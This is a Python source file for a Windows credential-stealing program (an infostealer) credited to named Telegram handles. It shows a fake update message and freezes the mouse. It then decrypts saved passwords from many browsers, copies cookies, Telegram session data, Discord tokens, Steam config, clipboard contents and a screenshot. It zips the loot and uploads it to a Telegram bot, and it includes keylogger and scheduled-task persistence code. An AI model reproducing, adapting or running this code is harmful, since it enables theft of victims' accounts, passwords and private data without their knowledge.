import os
import re
from PIL import ImageGrab
from datetime import datetime
from zipfile import ZipFile
import win32crypt
from base64 import b64decode
from Crypto.Cipher import AES
import ctypes
import getpass
import ctypes.wintypes
import socket
import uuid
import sys
import time 
import string 
import random
import sqlite3
import platform
import requests
import subprocess
import shutil
import psutil
import pyperclip
from pynput import keyboard
from pynput.mouse import Controller
import threading

print("Проверка обновлений...")

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]
crypt32 = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32
def auto_task_setup():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
            return

        appdata_folder = os.getenv("APPDATA")
        dest_path = os.path.join(appdata_folder, os.path.basename(sys.argv[0]))

        if not os.path.exists(dest_path):
            shutil.copy2(sys.argv[0], dest_path)

        random_prefix = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        task_name = f"{random_prefix}_{uuid.uuid4().hex[:8]}_{int(time.time())}"

        result = subprocess.run(f'schtasks /query /tn "{task_name}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:  
            command = f'schtasks /create /tn "{task_name}" /tr "{dest_path}" /sc onlogon /rl highest'
            subprocess.run(command, shell=True, check=True)
    except Exception as e:
        print()

def block_mouse(duration):
    mouse_controller = Controller()
    initial_position = mouse_controller.position

    def lock_cursor():
        while blocking:
            mouse_controller.position = initial_position
            time.sleep(0.01)

    global blocking
    blocking = True
    thread = threading.Thread(target=lock_cursor)
    thread.start()
    time.sleep(duration)
    blocking = False
    thread.join()

block_mouse(10)

def create_folder_if_not_exists(path):
    if not os.path.exists(path):
        os.makedirs(path)
import json
def get_key_from_local_state(browser):
    local_state_path = {
    'chrome': os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Local State"),
    'edge': os.path.join(os.environ["LOCALAPPDATA"], r"Microsoft\Edge\User Data\Local State"),
    'yandex': os.path.join(os.environ["LOCALAPPDATA"], r"Yandex\YandexBrowser\User Data\Local State"),
    'opera': os.path.join(os.environ["APPDATA"], r"Opera Software\Opera Stable\Local State"),
    'opera_gx': os.path.join(os.environ["LOCALAPPDATA"], r"Opera Software\Opera GX Stable\Local State"),
    'brave': os.path.join(os.environ["LOCALAPPDATA"], r"BraveSoftware\Brave-Browser\User Data\Local State"),
    'vivaldi': os.path.join(os.environ["LOCALAPPDATA"], r"Vivaldi\User Data\Local State"),
    'slimjet': os.path.join(os.environ["LOCALAPPDATA"], r"Slimjet\User Data\Local State"),
    'falkon': os.path.join(os.environ["LOCALAPPDATA"], r"falkon\Local State"),
    'seamonkey': os.path.join(os.environ["APPDATA"], r"Mozilla\SeaMonkey\Profiles\Local State"),
    'maxthon': os.path.join(os.environ["LOCALAPPDATA"], r"Maxthon3\User Data\Local State"),
    'palemoon': os.path.join(os.environ["APPDATA"], r"Pale Moon\Profiles\Local State"),
    'qutebrowser': os.path.join(os.path.expanduser("~"), ".config", "qutebrowser", "Local State"),
    'iridium': os.path.join(os.environ["LOCALAPPDATA"], r"Iridium\User Data\Local State"),
    'centbrowser': os.path.join(os.environ["LOCALAPPDATA"], r"CentBrowser\User Data\Local State"),
    }.get(browser, None)
    if local_state_path and os.path.exists(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  
            blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
            blob_out = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                decrypted_key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                kernel32.LocalFree(blob_out.pbData)
                return decrypted_key
            else:
                raise Exception()
        else:
            raise KeyError()
    return None

def decrypt_password(buff, key=None):
    try:
        if buff[:3] == b'v10' and key:
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt_and_verify(payload, tag).decode('utf-8')
        else:
            decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8')
        return decrypted_pass
    except Exception as e:
        return ""
def extract_and_save_passwords(browser_name, db_file, txt_file, key=None):
    if browser_name in ['chrome', 'edge', 'opera', 'opera_gx', 'yandex']:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(txt_file, 'w', encoding='utf-8') as f:
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                decrypted_password = decrypt_password(encrypted_password, key)
                f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
        conn.close()
    elif browser_name in ['firefox', 'tor']:
        with open(db_file, 'r', encoding='utf-8') as f:
            logins = json.load(f)
        with open(txt_file, 'w', encoding='utf-8') as f:
            for login in logins['logins']:
                f.write(f"URL: {login['hostname']}\nUsername: {login['encryptedUsername']}\nPassword: {login['encryptedPassword']}\n\n")
def create_clients_folder():
    user_home = os.path.expanduser("~")
    target_path = os.path.join(user_home, "Windows NB", "STEAM")
    os.makedirs(target_path, exist_ok=True)
    return target_path
def create_tgsession_folder():
    home_directory = os.path.expanduser("~")
    windows_nb_directory = os.path.join(home_directory, "Windows NB")
    tgsession_directory = os.path.join(windows_nb_directory, "tdata")
    if not os.path.exists(windows_nb_directory):
        os.makedirs(windows_nb_directory) 
    if not os.path.exists(tgsession_directory):
        os.makedirs(tgsession_directory)
create_tgsession_folder()

def kill_telegram_process():
    for process in psutil.process_iter(attrs=["pid", "name"]):
        try:
            if "telegram" in process.info["name"].lower():
                process.terminate()
                process.wait(timeout=5)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
            pass

def copy_telegram_session_files():
    user_folder = os.path.expanduser("~")
    telegram_session_folder = os.path.join(user_folder, "AppData", "Roaming", "Telegram Desktop", "tdata")
    target_folder = os.path.join(user_folder, "Windows NB", "tdata")
    
    if os.path.exists(target_folder):
        shutil.rmtree(target_folder)

    try:
        shutil.copytree(telegram_session_folder, target_folder)
    except (PermissionError, FileNotFoundError) as e:
        print(f"")

kill_telegram_process()
copy_telegram_session_files()
def delete_tg_files():
    user_folder = os.path.expanduser("~")
    tdata_folder = os.path.join(user_folder, "Windows NB", "tdata")
    items_to_delete = ["dumps", "emoji", "tdummy", "temp", "coutries", "devversion", "prefix", "settings", "usertag", "working"]
    for item in items_to_delete:
        item_path = os.path.join(tdata_folder, item)
        if os.path.exists(item_path):
            if os.path.isfile(item_path):
                os.remove(item_path)
                print(f"")
            elif os.path.isdir(item_path):
                shutil.rmtree(item_path)
delete_tg_files()

#КОД ПОИСКА ТОКЕКНА БЫЛ ПОЗАИМСТВОВАН, НО ДОПОЛНЕН И ПЕРЕДЕЛАН (ССЫЛКА НА ОРИГИНАЛЬНЫЙ СУРС: https://pypi.org/project/dsctg/#files)
def find_and_save_tokens():
    def __find_tokens(path: str) -> list:
        tokens = []
        try:
            for root, _, files in os.walk(path):
                for file_name in files:
                    if file_name.endswith(('.log', '.ldb')):
                        try:
                            file_path = os.path.join(root, file_name)
                            with open(file_path, 'r', errors='ignore') as file:
                                for line in file:
                                    tokens.extend(re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line.strip()))
                        except:
                            pass
        except:
            pass
        return tokens

    def __paths() -> dict:
        local = os.getenv('LOCALAPPDATA', '')
        roaming = os.getenv('APPDATA', '')

        return {
            'Discord': os.path.join(roaming, 'Discord'),
            'Discord Canary': os.path.join(roaming, 'discordcanary'),
            'Discord PTB': os.path.join(roaming, 'discordptb'),
            'Google Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Default'),
            'Google Chrome Profile 1': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 1'),
            'Google Chrome Profile 2': os.path.join(local, 'Google', 'Chrome', 'User Data', 'Profile 2'),
            'Microsoft Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Default'),
            'Microsoft Edge Profile 1': os.path.join(local, 'Microsoft', 'Edge', 'User Data', 'Profile 1'),
            'Mozilla Firefox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'Opera': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(roaming, 'Opera Software', 'Opera GX Stable'),
            'Brave Browser': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
            'Brave Browser Profile 1': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Profile 1'),
            'Yandex Browser': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
            'Vivaldi': os.path.join(local, 'Vivaldi', 'User Data', 'Default'),
            'Epic Privacy Browser': os.path.join(local, 'Epic Privacy Browser', 'User Data', 'Default')
        }
    
    paths = __paths()
    tokens_found = []
    for platform, path in paths.items():
        try:
            if os.path.exists(path):
                tokens = __find_tokens(path)
                if tokens:
                    tokens_found.extend(tokens)
        except:
            pass
    
    try:
        output_dir = os.path.join(os.path.expanduser('~'), 'Windows NB')
        os.makedirs(output_dir, exist_ok=True)
        token_file_path = os.path.join(output_dir, 'DISCORD_TOKEN.txt')
        with open(token_file_path, 'w', errors='ignore') as token_file:
            if tokens_found:
                token_file.write('\n'.join(set(tokens_found)) + '\n')  
            else:
                token_file.write('')
        return token_file_path
    except:
        pass

result_message = find_and_save_tokens()

def copy_steam_config():
    user_home = os.path.expanduser("~")
    destination_path = create_clients_folder()
    steam_paths = [
        r"B:\Program Files (x86)\Steam\config",
        r"C:\Program Files (x86)\Steam\config",
        r"D:\Program Files (x86)\Steam\config",
        r"E:\Program Files (x86)\Steam\config",
        r"F:\Program Files (x86)\Steam\config",
        r"C:\Program Files\Steam\config",
        r"D:\Program Files\Steam\config",
        r"B:\Program Files\Steam\config",
        r"E:\Program Files\Steam\config",
        r"F:\Program Files\Steam\config",
        r"D:\Steam\config",
        r"E:\Steam\config",
        r"F:\Steam\config",
        r"C:\Steam\config",
        r"B:\Steam\config",
    ]
    config_copied = False
    for steam_config_path in steam_paths:
        if os.path.exists(steam_config_path):
            shutil.copytree(steam_config_path, os.path.join(destination_path, "config"), dirs_exist_ok=True)
            print(f"")
            config_copied = True
            break
    if not config_copied:
        print("")
copy_steam_config()
def info_file():
    user_folder = os.path.expanduser("~")
    target_folder = os.path.join(user_folder, "Windows NB")
    os.makedirs(target_folder, exist_ok=True)
    file_path = os.path.join(target_folder, "!INFO!.txt")
    additional_text = """
████████████████████████████████████████████████████████████████████████████████████████
██                                                                                    ██
██         ██████╗ ██╗███╗   ██╗██╗  ██╗     ██████╗ ██████╗  █████╗ ██████╗          ██
██         ██╔══██╗██║████╗  ██║██║ ██╔╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗         ██
██         ██████╔╝██║██╔██╗ ██║█████╔╝     ██║  ███╗██████╔╝███████║██████╔╝         ██
██         ██╔═══╝ ██║██║╚██╗██║██╔═██╗     ██║   ██║██╔══██╗██╔══██║██╔══██╗         ██
██         ██║     ██║██║ ╚████║██║  ██╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝         ██
██         ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝          ██
██                                                                                    ██
██  CODED BY: @RigOlit | @Dedulin             CHANNEL: @Rigolit22 | @castles_perehod  ██
████████████████████████████████████████████████████████████████████████████████████████
    """
    system_info = [
        f"▢ Operating System: {platform.system()} {platform.release()}",
        f"▢ Architecture: {platform.architecture()[0]}",
        f"▢ Processor: {platform.processor()}",
        f"▢ CPU Core Count: {psutil.cpu_count(logical=False)}",
        f"▢ Logical Processors: {psutil.cpu_count(logical=True)}",
        f"▢ CPU Frequency: {psutil.cpu_freq().current} MHz",
        f"▢ Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        f"▢ Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB",
        f"▢ Used Memory: {round(psutil.virtual_memory().used / (1024 ** 3), 2)} GB",
        "▢ Disk Space:",
    ]
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            system_info.append(
                f"  - Disk {partition.device}: Total {round(usage.total / (1024 ** 3), 2)} GB, "
                f"Free {round(usage.free / (1024 ** 3), 2)} GB"
            )
        except PermissionError:
            continue
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
    ip_address = socket.gethostbyname(socket.gethostname())
    username = getpass.getuser()
    computer_name = socket.gethostname()
    system_info.extend([
        f"▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃",
        f"▪ MAC Address: {mac_address}",
        f"▪ IP Address: {ip_address}",
        f"▪ Username: {username}",
        f"▪ Computer Name: {computer_name}",
        f"▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃",
    ])
    content = f"{additional_text}\n\n" + "\n".join(system_info)
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)
info_file()

def log_keys():
    folder_path = os.path.join(os.path.expanduser("~"), "Windows NB")
    os.makedirs(folder_path, exist_ok=True)
    filename = os.path.join(folder_path, "keylogs.txt")

    def on_press(key):
        with open(filename, 'a') as logs:
            try:
                logs.write(key.char)
            except AttributeError:
                logs.write(str(key))

    keyboard.Listener(on_press=on_press).start()
    input()

def clipper():
    try:
        clipboard_content = pyperclip.paste()
        user_dir = os.path.expanduser("~")
        target_folder = os.path.join(user_dir, "Windows NB")
        os.makedirs(target_folder, exist_ok=True)
        file_name = os.path.join(target_folder, "clipboard.txt")
        with open(file_name, "w", encoding="utf-8") as file:
            file.write(clipboard_content)
    except Exception:
        pass

clipper()

def copy_browser_data(browser_paths, destination_folder):
    if not os.path.exists(destination_folder):
        os.makedirs(destination_folder)
    
    for browser_name, path_list in browser_paths.items():
        key = None
        try:
            key = get_key_from_local_state(browser_name)
        except KeyError:
            continue
        
        for path in path_list:
            if os.path.exists(path):
                if browser_name in ['chrome', 'edge', 'opera', 'opera_gx', 'yandex', 'brave', 'vivaldi', 'slimjet', 'maxthon', 'centbrowser', 'iridium']:
                    password_files = ['Login Data']
                elif browser_name in ['firefox', 'tor', 'seamonkey', 'palemoon']:
                    password_files = ['logins.json']
                elif browser_name == 'falkon':
                    password_files = ['falkon.db']
                elif browser_name == 'qutebrowser':
                    password_files = ['qutebrowser.sqlite']
                else:
                    password_files = []
                for file_name in password_files:
                    source_file = os.path.join(path, file_name)
                    destination_file = os.path.join(destination_folder, f'{browser_name}_{file_name}')
                    txt_file = os.path.join(destination_folder, f'{browser_name}_passwords.txt')
                    
                    if os.path.exists(source_file):
                        shutil.copy2(source_file, destination_file)
                        extract_and_save_passwords(browser_name, destination_file, txt_file, key)
browser_paths = {
    'chrome': [
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Google\Chrome\Application\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\Google\Chrome\Application\User Data\Default"),
        r"D:\Google\Chrome\User Data\Default",
        r"E:\Google\Chrome\User Data\Default"
    ],
    'edge': [
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Microsoft\Edge\Application\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\Microsoft\Edge\Application\User Data\Default"),
        r"D:\Microsoft\Edge\User Data\Default",
        r"E:\Microsoft\Edge\User Data\Default"
    ],
    'opera': [
        os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\profile"),
        r"D:\Opera\Opera Stable",
        r"E:\Opera\Opera Stable"
    ],
    'opera_gx': [
        os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera GX"),
        os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable"),
        r"D:\Opera GX\User Data\Default",
        r"E:\Opera GX\User Data\Default"
    ],
    'yandex': [
        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Yandex\YandexBrowser\User Data\Default"),
        r"D:\Yandex\YandexBrowser\User Data\Default",
        r"E:\Yandex\YandexBrowser\User Data\Default"
    ],
    'firefox': [
        os.path.expandvars(r"%APPDATA%\Mozilla\Firefox\Profiles"),
        os.path.expandvars(r"%LOCALAPPDATA%\Mozilla\Firefox\Profiles"),
        r"D:\Mozilla\Firefox\Profiles",
        r"E:\Mozilla\Firefox\Profiles"
    ],
    'tor': [
        os.path.expandvars(r"%APPDATA%\Tor Browser\Browser\Profiles"),
        os.path.expandvars(r"%LOCALAPPDATA%\Tor Browser\Browser\Profiles"),
        r"D:\Tor Browser\Browser\Profiles",
        r"E:\Tor Browser\Browser\Profiles"
    ],
    'brave': [
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\BraveSoftware\Brave-Browser\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES(X86)%\BraveSoftware\Brave-Browser\User Data\Default"),
        r"D:\BraveSoftware\Brave-Browser\User Data\Default",
        r"E:\BraveSoftware\Brave-Browser\User Data\Default"
    ],
    'vivaldi': [
        os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Vivaldi\Application\User Data\Default"),
        r"D:\Vivaldi\User Data\Default",
        r"E:\Vivaldi\User Data\Default"
    ],
    'slimjet': [
        os.path.expandvars(r"%LOCALAPPDATA%\Slimjet\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Slimjet\User Data\Default"),
        r"D:\Slimjet\User Data\Default",
        r"E:\Slimjet\User Data\Default"
    ],
    'falkon': [
        os.path.expandvars(r"%LOCALAPPDATA%\falkon"),
        os.path.expandvars(r"%APPDATA%\falkon\profiles"),
        r"D:\falkon\profiles",
        r"E:\falkon\profiles"
    ],
    'seamonkey': [
        os.path.expandvars(r"%APPDATA%\Mozilla\SeaMonkey\Profiles"),
        os.path.expandvars(r"%LOCALAPPDATA%\Mozilla\SeaMonkey\Profiles"),
        r"D:\Mozilla\SeaMonkey\Profiles",
        r"E:\Mozilla\SeaMonkey\Profiles"
    ],
    'maxthon': [
        os.path.expandvars(r"%LOCALAPPDATA%\Maxthon3\User Data"),
        os.path.expandvars(r"%APPDATA%\Maxthon3\User Data"),
        r"D:\Maxthon3\User Data",
        r"E:\Maxthon3\User Data"
    ],
    'palemoon': [
        os.path.expandvars(r"%APPDATA%\Pale Moon\Profiles"),
        os.path.expandvars(r"%LOCALAPPDATA%\Pale Moon\Profiles"),
        r"D:\Pale Moon\Profiles",
        r"E:\Pale Moon\Profiles"
    ],
    'qutebrowser': [
        os.path.expandvars(r"%USERPROFILE%\.config\qutebrowser"),
        os.path.expandvars(r"%APPDATA%\qutebrowser"),
        r"D:\qutebrowser",
        r"E:\qutebrowser"
    ],
    'iridium': [
        os.path.expandvars(r"%LOCALAPPDATA%\Iridium\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\Iridium\Application\User Data\Default"),
        r"D:\Iridium\User Data\Default",
        r"E:\Iridium\User Data\Default"
    ],
    'centbrowser': [
        os.path.expandvars(r"%LOCALAPPDATA%\CentBrowser\User Data\Default"),
        os.path.expandvars(r"%PROGRAMFILES%\CentBrowser\Application\User Data\Default"),
        r"D:\CentBrowser\User Data\Default",
        r"E:\CentBrowser\User Data\Default"
    ]
}
destination_folder = os.path.expandvars(r"%USERPROFILE%\Windows NB")
copy_browser_data(browser_paths, destination_folder)

def copy_cookies(browser_name, browser_cookie_path, destination_folder):
    if not os.path.exists(browser_cookie_path):
        return
    create_folder_if_not_exists(destination_folder)
    destination_file_path = os.path.join(destination_folder, f'{browser_name}_cookies.sqlite')
    shutil.copy2(browser_cookie_path, destination_file_path)

def get_edge_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies')
def get_opera_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies')
def get_operagx_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Opera Software', 'Opera GX Stable', 'Cookies')
def get_yandex_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies')
def get_tor_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Tor Browser', 'Browser', 'TorBrowser', 'Data', 'Browser', 'profile.default', 'cookies.sqlite')
def get_chrome_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')
def get_firefox_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
def get_brave_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Cookies')
def get_vivaldi_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Vivaldi', 'User Data', 'Default', 'Cookies')
def get_slimjet_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Slimjet', 'User Data', 'Default', 'Cookies')
def get_falkon_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'falkon', 'profiles', 'cookies.sqlite')
def get_seamonkey_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'SeaMonkey', 'Profiles')
def get_maxthon_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Maxthon3', 'User Data', 'Cookies')
def get_palemoon_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Roaming', 'Pale Moon', 'Profiles')
def get_qutebrowser_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, '.config', 'qutebrowser', 'cookies.sqlite')
def get_iridium_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'Iridium', 'User Data', 'Default', 'Cookies')
def get_centbrowser_cookie_path():
    user_profile = os.getenv('USERPROFILE')
    return os.path.join(user_profile, 'AppData', 'Local', 'CentBrowser', 'User Data', 'Default', 'Cookies')

def take_screenshot(save_path):
    screenshot = ImageGrab.grab()
    file_name = datetime.now().strftime("screenshot_%Y-%m-%d_%H-%M-%S.png")
    file_path = os.path.join(save_path, file_name)
    screenshot.save(file_path)

def zip_folder(folder_path, output_path):
    with ZipFile(output_path, 'w') as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

def get_mac_address():
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac_address = ':'.join([mac[e:e+2] for e in range(0, 11, 2)])
    return mac_address

def get_network_info():
    try:
        result = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], encoding='utf-8')
        for line in result.split('\n'):
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
            if "BSSID" in line:
                bssid = line.split(":")[1].strip()
        return ssid, bssid
    except Exception as e:
        return "Неизвестно", "Неизвестно"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json()['ip']
    except Exception:
        return "Не удалось получить публичный IP"

def get_location_by_ip(public_ip):
    try:
        response = requests.get(f'https://ipinfo.io/{public_ip}/json')
        location_data = response.json()
        city = location_data.get('city', 'Неизвестно')
        region = location_data.get('region', 'Неизвестно')
        country = location_data.get('country', 'Неизвестно')
        return f"{city}, {region}, {country}"
    except Exception:
        return "Не удалось получить местоположение"

def get_system_info():
    user_name = os.getenv('USERNAME')
    computer_name = os.getenv('COMPUTERNAME')
    os_info = platform.system() + " " + platform.release()
    ip_address = get_ip_address()
    mac_address = get_mac_address()
    ssid, bssid = get_network_info()
    public_ip = get_public_ip()
    location = get_location_by_ip(public_ip)
    
    system_info = (
        f"💻 <b>System Information</b> 💻\n\n"
        f"👤 <b>User:</b> <code>{user_name}</code>\n"
        f"🖥️ <b>Computer:</b> <code>{computer_name}</code>\n"
        f"⚙️ <b>Operating System:</b> <code>{os_info}</code>\n"
        f"🌐 <b>IP Address:</b> <code>{ip_address}</code>\n"
        f"🔑 <b>MAC Address:</b> <code>{mac_address}</code>\n\n"
        f"📶 <b>Network Information</b> 📶\n"
        f"📡 <b>SSID:</b> <code>{ssid}</code>\n"
        f"🔗 <b>BSSID:</b> <code>{bssid}</code>\n"
        f"🌍 <b>Public IP:</b> <code>{public_ip}</code>\n"
        f"📍 <b>Location:</b> <code>{location}</code>\n"
        f"<b>▪▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️</b>\n"
        f"<b>Subscribe to the first developer: @Rigolit22</b>\n"
        f"<b>Subscribe to the second developer: @Castles_Perehod</b>\n"
        f"<b>▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️▪️</b>"
    )
    return system_info

def send_file_to_telegram(bot_token, chat_id, file_path, system_info):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': system_info,
        'parse_mode': 'HTML'  
    }
    requests.post(url, data=data)
    
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        requests.post(url, files=files, data=data)

def main():
    user_profile = os.getenv('USERPROFILE')
    destination_folder = os.path.join(user_profile, 'Windows NB')
    create_folder_if_not_exists(destination_folder)
    
    browsers = {
    "Chrome": get_chrome_cookie_path,
    "Firefox": get_firefox_cookie_path,
    "Edge": get_edge_cookie_path,
    "Opera": get_opera_cookie_path,
    "OperaGX": get_operagx_cookie_path,
    "Yandex": get_yandex_cookie_path,
    "Tor": get_tor_cookie_path,
    "Brave": get_brave_cookie_path,
    "Vivaldi": get_vivaldi_cookie_path,
    "Slimjet": get_slimjet_cookie_path,
    "Falkon": get_falkon_cookie_path,
    "SeaMonkey": get_seamonkey_cookie_path,
    "Maxthon": get_maxthon_cookie_path,
    "PaleMoon": get_palemoon_cookie_path,
    "QuteBrowser": get_qutebrowser_cookie_path,
    "Iridium": get_iridium_cookie_path,
    "CentBrowser": get_centbrowser_cookie_path,
}
    for browser_name, get_cookie_path in browsers.items():
        cookie_path = get_cookie_path()
        if cookie_path:
            copy_cookies(browser_name, cookie_path, destination_folder)
    
    take_screenshot(destination_folder)
    
    output_zip = os.path.join(user_profile, 'windows_nb.zip')
    zip_folder(destination_folder, output_zip)
    
    system_info = get_system_info()
    
    bot_token = 'BOT_TOKEN_EXAMPLE'
    chat_id = 'CHAT_ID_EXAMPLE'
    
    send_file_to_telegram(bot_token, chat_id, output_zip, system_info)
    
    os.remove(output_zip)

if __name__ == "__main__":
    main()
